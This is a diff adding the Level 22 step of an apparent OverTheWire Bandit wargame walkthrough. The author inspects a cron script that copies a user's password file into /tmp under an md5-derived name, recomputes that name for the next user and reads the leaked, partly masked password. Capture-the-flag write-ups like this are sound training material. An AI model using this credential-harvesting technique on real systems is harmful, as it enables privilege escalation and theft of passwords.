@@ -220,3 +220,23 @@ Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ```
 
 #### Level 22
+I was expecting obsfruscated code but it was much easier
+```s
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:~$ export myname="bandit23"
+
+bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8xxxxxxxxxx
+```
